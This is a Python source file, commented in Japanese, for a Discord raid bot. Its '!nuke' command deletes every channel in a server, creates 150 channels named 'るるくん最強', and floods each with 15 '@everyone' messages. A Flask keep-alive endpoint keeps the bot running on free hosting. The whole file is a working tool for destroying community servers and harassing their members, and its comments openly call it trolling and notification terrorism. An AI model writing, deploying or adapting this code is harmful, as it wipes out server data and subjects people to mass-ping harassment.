import os
import threading
import discord
from discord.ext import commands
from discord import app_commands, utils, ui
from flask import Flask, jsonify
import logging
import time
import random
import asyncio

# ログはうるせえから警告レベルに下げておけ
logging.basicConfig(level=logging.WARNING)

# --- 🚨 KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 荒らし機能のために必要なインテントをすべて有効にする
intents.guilds = True
intents.members = True 
intents.message_content = True 

# 🚨 Prefixを '!' に設定
bot = commands.Bot(command_prefix="!", intents=intents)

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing. Fuck!")

except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 最終破壊機能 (即時実行 & 15回分割スパム) ---
# ----------------------------------------------------

# コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@bot.command(name="nuke") 
@commands.has_permissions(administrator=True) # サーバーを破壊するには最高権限が必要だ！
async def ultimate_nuke_command(ctx): 
    
    guild = ctx.guild
    
    # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
    await ctx.send(
        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！ 🔥🔥🔥"
    )

    # 1. 全てのチャンネルを削除
    deletion_tasks = []
    for channel in guild.channels:
        # タイムアウトしないようにタスクを並列で実行
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 「るるくん最強」チャンネルを150個作成
    creation_tasks = []
    channel_name = "るるくん最強"
    num_channels = 150

    logging.warning(f"🔨 CREATION STARTED! 「{channel_name}」チャンネルを{num_channels}個作成する！")

    # 作成タスクを並列で実行
    for i in range(num_channels):
        name_with_index = f"{channel_name}-{i+1}"
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name_with_index)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")

    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信
    if successful_channels:
        # 🚨 ここを修正: 1回分のメッセージ内容
        spam_message_content = "@everyone るるくん最強ww"
        spam_count = 15
        
        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 のスパムを送りつけるぞ！通知テロだ！")

        spam_tasks = []
        for channel in successful_channels:
            # チャンネルごとに15回メッセージを送信するタスクを作成
            async def send_spam_burst(ch, msg, count):
                for _ in range(count):
                    try:
                        await ch.send(msg)
                    except Exception:
                        # 送信エラーは無視
                        pass
            
            spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
            
        try:
            # 全てのスパムバーストの完了を待つ
            await asyncio.gather(*spam_tasks)
        except Exception as e:
            logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")

    # 4. 最終報告
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築された。今やこのサーバーは「るるくん最強」が支配する！\n"
            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
        )
    
    # 実行元のコンテキストは既に削除されているため、これ以上のメッセージ送信はできない。


# ----------------------------------------------------
# --- Discord イベント & 起動 (その他のコードは省略なし) ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時に実行"""
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(name="サーバーを破壊中... !nuke")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
    try:
        logging.warning("スラッシュコマンドは無視。!nukeコマンドが有効になったぜ。")
    except Exception as e:
        logging.error(f"コマンドの同期中にエラーが発生した: {e}")

@bot.event
async def on_message(message):
    """メッセージイベント"""
    if message.author.bot:
        return
        
    await bot.process_commands(message)


# ----------------------------------------------------
# --- Render/Uptime Robot対応: KeepAlive Server ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！間違ってんじゃねえか？")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        return "Bot is starting up or failed to start... Get fucked!", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
